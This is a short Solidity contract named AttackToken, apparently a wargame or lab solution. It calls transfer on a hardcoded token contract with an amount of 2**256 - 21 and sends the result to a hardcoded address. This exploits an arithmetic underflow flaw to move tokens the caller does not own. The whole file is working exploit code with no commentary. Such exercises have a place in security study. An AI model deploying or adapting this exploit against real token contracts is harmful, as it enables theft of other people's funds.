pragma solidity 0.8.10;

interface IToken{
    function transfer(address _to, uint _value) external returns (bool);
}

contract AttackToken{  	
    address tokenAddress = 0x007E0ef5B081961Dc6D5b92fF375Dd077A7C1F33;
    IToken public tokenContract = IToken(tokenAddress);
    address sendTo = 0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1;

    function attack() external {		
        tokenContract.transfer(sendTo,2**256 - 21);
    }
}
